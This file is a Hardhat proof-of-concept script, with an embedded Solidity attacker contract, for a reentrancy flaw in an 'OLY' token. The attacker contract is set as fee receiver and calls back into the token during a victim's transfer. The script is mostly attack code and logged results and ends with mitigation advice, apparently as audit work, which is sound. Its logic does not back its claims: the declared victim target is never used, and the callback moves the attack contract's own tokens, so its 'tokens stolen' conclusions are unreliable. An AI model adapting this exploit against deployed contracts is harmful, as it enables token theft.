/**
 * CVE-OLY-004: Reentrancy Attack Exploit
 * 
 * CRITICAL VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how the external call to fee receiver during
 * transfer execution can be exploited for reentrancy attacks to manipulate
 * contract state and potentially steal tokens.
 * 
 * âš ï¸ FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("ðŸ”´ CVE-OLY-004: Reentrancy Attack Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, victim, mainPair] = await ethers.getSigners();
    
    console.log("ðŸ‘¤ Deployer:", deployer.address);
    console.log("ðŸ´â€â˜ ï¸ Attacker:", attacker.address);
    console.log("ðŸ˜‡ Victim:", victim.address);
    console.log("ðŸª Main Pair:", mainPair.address);
    console.log("");

    // Step 1: Deploy reentrancy attack contract
    console.log("ðŸ“‹ Step 1: Deploying Reentrancy Attack Contract...");
    
    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attackContract = await ReentrancyAttacker.deploy();
    await attackContract.waitForDeployment();
    
    console.log("ðŸ’€ Reentrancy Attacker deployed at:", await attackContract.getAddress());

    // Step 2: Deploy OLY contract with attack contract as fee receiver
    console.log("\nðŸ“‹ Step 2: Deploying OLY Contract with Attack Contract as Fee Receiver...");
    
    const OLY = await ethers.getContractFactory("OLY");
    const oly = await OLY.deploy(await attackContract.getAddress(), 3000); // 3% buy fee
    await oly.waitForDeployment();
    
    console.log("ðŸª™ OLY Contract deployed at:", await oly.getAddress());
    
    // Set the OLY contract address in the attack contract
    await attackContract.setOLYContract(await oly.getAddress());
    await attackContract.setAttacker(attacker.address);

    // Step 3: Setup contract state
    console.log("\nðŸ“‹ Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens for testing
    const mintAmount = ethers.parseUnits("10000", 9);
    await oly.mint(victim.address, mintAmount);
    await oly.mint(mainPair.address, mintAmount);
    await oly.mint(attacker.address, mintAmount);
    
    console.log("âœ… Main pair set to:", mainPair.address);
    console.log("âœ… Tokens minted to victim:", ethers.formatUnits(mintAmount, 9));
    console.log("âœ… Tokens minted to main pair:", ethers.formatUnits(mintAmount, 9));
    console.log("âœ… Tokens minted to attacker:", ethers.formatUnits(mintAmount, 9));

    // Step 4: Record initial state
    console.log("\nðŸ“‹ Step 4: Recording Initial State...");
    
    const initialTotalSupply = await oly.totalSupply();
    const initialAttackerBalance = await oly.balanceOf(attacker.address);
    const initialVictimBalance = await oly.balanceOf(victim.address);
    const initialMainPairBalance = await oly.balanceOf(mainPair.address);
    const initialAttackContractBalance = await oly.balanceOf(await attackContract.getAddress());
    
    console.log("ðŸ“Š Initial Total Supply:", ethers.formatUnits(initialTotalSupply, 9));
    console.log("ðŸ“Š Initial Attacker Balance:", ethers.formatUnits(initialAttackerBalance, 9));
    console.log("ðŸ“Š Initial Victim Balance:", ethers.formatUnits(initialVictimBalance, 9));
    console.log("ðŸ“Š Initial Main Pair Balance:", ethers.formatUnits(initialMainPairBalance, 9));
    console.log("ðŸ“Š Initial Attack Contract Balance:", ethers.formatUnits(initialAttackContractBalance, 9));

    // Step 5: Setup the reentrancy attack
    console.log("\nðŸ“‹ Step 5: Setting up Reentrancy Attack...");
    
    const attackAmount = ethers.parseUnits("1000", 9);
    
    // Configure the attack contract
    await attackContract.setReentrancyTarget(victim.address);
    await attackContract.setReentrancyAmount(ethers.parseUnits("500", 9));
    await attackContract.enableAttack();
    
    console.log("ðŸŽ¯ Attack configured:");
    console.log("   â€¢ Target: Steal from", victim.address);
    console.log("   â€¢ Reentrancy amount:", ethers.formatUnits(ethers.parseUnits("500", 9), 9));
    console.log("   â€¢ Attack enabled: true");

    // Step 6: Execute the reentrancy attack
    console.log("\nðŸ“‹ Step 6: Executing Reentrancy Attack...");
    
    console.log("ðŸš€ Victim initiating sell transaction...");
    console.log("ðŸ’€ Attack contract will perform reentrancy during fee collection...");
    
    try {
        // Victim sells tokens, triggering the reentrancy attack
        const tx = await oly.connect(victim).transfer(mainPair.address, attackAmount);
        await tx.wait();
        
        console.log("âœ… Transaction completed");
        
    } catch (error) {
        console.log("âŒ Transaction failed:", error.message);
        
        if (error.message.includes("reentrant") || error.message.includes("ReentrancyGuard")) {
            console.log("âœ… Reentrancy protection detected - vulnerability mitigated");
        } else {
            console.log("ðŸ’€ Unexpected error - may indicate successful attack");
        }
    }

    // Step 7: Analyze attack results
    console.log("\nðŸ“‹ Step 7: Analyzing Attack Results...");
    
    const finalTotalSupply = await oly.totalSupply();
    const finalAttackerBalance = await oly.balanceOf(attacker.address);
    const finalVictimBalance = await oly.balanceOf(victim.address);
    const finalMainPairBalance = await oly.balanceOf(mainPair.address);
    const finalAttackContractBalance = await oly.balanceOf(await attackContract.getAddress());
    
    console.log("ðŸ“Š Final Balances:");
    console.log("ðŸ“Š Final Attacker Balance:", ethers.formatUnits(finalAttackerBalance, 9));
    console.log("ðŸ“Š Final Victim Balance:", ethers.formatUnits(finalVictimBalance, 9));
    console.log("ðŸ“Š Final Main Pair Balance:", ethers.formatUnits(finalMainPairBalance, 9));
    console.log("ðŸ“Š Final Attack Contract Balance:", ethers.formatUnits(finalAttackContractBalance, 9));
    console.log("ðŸ“Š Final Total Supply:", ethers.formatUnits(finalTotalSupply, 9));
    
    // Calculate changes
    const attackerGain = finalAttackerBalance - initialAttackerBalance;
    const victimLoss = initialVictimBalance - finalVictimBalance;
    const mainPairGain = finalMainPairBalance - initialMainPairBalance;
    const attackContractGain = finalAttackContractBalance - initialAttackContractBalance;
    const supplyChange = finalTotalSupply - initialTotalSupply;
    
    console.log("\nðŸ“ˆ Balance Changes:");
    console.log("ðŸ“ˆ Attacker Change:", ethers.formatUnits(attackerGain, 9));
    console.log("ðŸ“ˆ Victim Loss:", ethers.formatUnits(victimLoss, 9));
    console.log("ðŸ“ˆ Main Pair Gain:", ethers.formatUnits(mainPairGain, 9));
    console.log("ðŸ“ˆ Attack Contract Gain:", ethers.formatUnits(attackContractGain, 9));
    console.log("ðŸ“ˆ Total Supply Change:", ethers.formatUnits(supplyChange, 9));

    // Step 8: Check for reentrancy indicators
    console.log("\nðŸ“‹ Step 8: Checking for Reentrancy Indicators...");
    
    const attackCount = await attackContract.attackCount();
    const lastAttackAmount = await attackContract.lastAttackAmount();
    
    console.log("ðŸ” Attack Statistics:");
    console.log("   â€¢ Attack count:", attackCount.toString());
    console.log("   â€¢ Last attack amount:", ethers.formatUnits(lastAttackAmount, 9));
    
    if (attackCount > 0n) {
        console.log("ðŸš¨ REENTRANCY ATTACK DETECTED!");
        console.log("ðŸ’€ Attack contract successfully called back into OLY contract");
        
        if (attackerGain > 0n) {
            console.log("ðŸ’° TOKENS STOLEN: Attacker gained", ethers.formatUnits(attackerGain, 9), "tokens");
        }
        
        if (supplyChange !== 0n) {
            console.log("ðŸš¨ TOTAL SUPPLY MANIPULATION DETECTED!");
        }
    } else {
        console.log("âœ… No reentrancy detected - contract may have protection");
    }

    // Step 9: Test multiple reentrancy attempts
    console.log("\nðŸ“‹ Step 9: Testing Multiple Reentrancy Attempts...");
    
    try {
        // Reset attack counter
        await attackContract.resetAttack();
        
        // Configure for multiple attacks
        await attackContract.setMaxAttacks(3);
        await attackContract.enableAttack();
        
        console.log("ðŸ”„ Attempting multiple reentrancy attacks...");
        
        const multiAttackAmount = ethers.parseUnits("200", 9);
        await oly.connect(victim).transfer(mainPair.address, multiAttackAmount);
        
        const finalAttackCount = await attackContract.attackCount();
        console.log("ðŸ“Š Total attacks executed:", finalAttackCount.toString());
        
        if (finalAttackCount > 1n) {
            console.log("ðŸš¨ MULTIPLE REENTRANCY SUCCESSFUL!");
            console.log("ðŸ’€ Contract vulnerable to repeated reentrancy");
        }
        
    } catch (error) {
        console.log("âŒ Multiple reentrancy test failed:", error.message);
    }

    // Step 10: Impact Assessment
    console.log("\nðŸ“‹ Step 10: Impact Assessment");
    console.log("=" .repeat(60));
    
    console.log("ðŸ” VULNERABILITY ANALYSIS:");
    console.log("   â€¢ External call occurs during state changes");
    console.log("   â€¢ No reentrancy protection (ReentrancyGuard)");
    console.log("   â€¢ Fee receiver can call back into contract");
    console.log("   â€¢ State manipulation possible during execution");
    console.log("");
    
    console.log("ðŸ’° POTENTIAL FINANCIAL IMPACT:");
    console.log("   â€¢ Token theft through balance manipulation");
    console.log("   â€¢ State consistency violations");
    console.log("   â€¢ Unpredictable contract behavior");
    console.log("   â€¢ Potential total supply manipulation");
    console.log("");
    
    console.log("ðŸ›¡ï¸ MITIGATION REQUIRED:");
    console.log("   â€¢ Implement ReentrancyGuard from OpenZeppelin");
    console.log("   â€¢ Apply nonReentrant modifier to _transfer function");
    console.log("   â€¢ Move external calls to end of function");
    console.log("   â€¢ Use checks-effects-interactions pattern");

    console.log("\nðŸ”´ REENTRANCY EXPLOIT ANALYSIS COMPLETED");
    console.log("âš ï¸ This demonstrates CRITICAL reentrancy vulnerability");
}

// Reentrancy Attack Contract Source
const reentrancyAttackerSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IOLY {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @dev This contract demonstrates reentrancy attacks on the OLY contract
 * âš ï¸ FOR TESTING PURPOSES ONLY
 */
contract ReentrancyAttacker {
    IOLY public olyContract;
    address public attacker;
    address public reentrancyTarget;
    uint256 public reentrancyAmount;
    bool public attackEnabled;
    uint256 public maxAttacks = 1;
    uint256 public attackCount;
    uint256 public lastAttackAmount;
    
    event AttackExecuted(uint256 count, uint256 amount);
    event ReentrancyAttempt(address target, uint256 amount);
    
    function setOLYContract(address _oly) external {
        olyContract = IOLY(_oly);
    }
    
    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }
    
    function setReentrancyTarget(address _target) external {
        reentrancyTarget = _target;
    }
    
    function setReentrancyAmount(uint256 _amount) external {
        reentrancyAmount = _amount;
    }
    
    function enableAttack() external {
        attackEnabled = true;
    }
    
    function disableAttack() external {
        attackEnabled = false;
    }
    
    function setMaxAttacks(uint256 _max) external {
        maxAttacks = _max;
    }
    
    function resetAttack() external {
        attackCount = 0;
        lastAttackAmount = 0;
    }
    
    /**
     * @dev This function is called during fee collection and performs reentrancy
     */
    function triggerSwapFeeForLottery() external {
        if (!attackEnabled || attackCount >= maxAttacks) {
            return;
        }
        
        attackCount++;
        lastAttackAmount = reentrancyAmount;
        
        emit ReentrancyAttempt(reentrancyTarget, reentrancyAmount);
        
        // Reentrancy attack: call back into OLY contract during execution
        try olyContract.transfer(attacker, reentrancyAmount) {
            emit AttackExecuted(attackCount, reentrancyAmount);
        } catch {
            // Attack failed, but we tried
        }
    }
    
    /**
     * @dev Fallback to receive tokens
     */
    receive() external payable {}
}
`;

// Export for use in other scripts
module.exports = {
    main,
    reentrancyAttackerSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("ðŸ’¥ Exploit failed:", error);
            process.exit(1);
        });
}